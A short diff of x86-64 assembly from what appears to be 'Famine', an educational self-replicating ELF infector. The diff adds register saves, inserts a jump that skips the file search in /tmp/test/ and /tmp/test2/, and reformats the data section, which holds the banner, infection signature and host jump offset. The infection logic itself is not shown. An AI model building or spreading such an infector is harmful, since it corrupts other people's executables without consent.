@@ -15,9 +15,11 @@
 
 famine64_func:
 	push	rax
+	push 	rbx
 	push 	rdi
 	sub 	rsp, 8
 
+	jmp famine64_end
 	lea 	rdi, [rel dir_one]
 	call 	find_files
 	lea 	rdi, [rel dir_two]
@@ -620,6 +622,7 @@ famine64_end:
 no_jump:
 	add 	rsp, 8
 	pop 	rdi
+	pop 	rbx
 	pop 	rax
 
 	cmp 	QWORD [rel jump_offset], 0x0 	; No jump address if the executable is the first
@@ -629,11 +632,11 @@ do_ret:
 	ret
 	
 data:
-	zero dq 0x00000000
-	famine64_size dd end_of_file - famine64_func
-	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
-	dir_one db "/tmp/test/", 0
-	dir_two db "/tmp/test2/", 0
-	signature dd 0x42CAFE42, 0x24EFAC24
-	jump_offset dq 0x00000000
+	zero			dq 0x00000000
+	famine64_size	dd end_of_file - famine64_func
+	banner			db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
+	dir_one			db "/tmp/test/", 0
+	dir_two			db "/tmp/test2/", 0
+	signature 		dd 0x42CAFE42, 0x24EFAC24
+	jump_offset 	dq 0x00000000
 end_of_file:
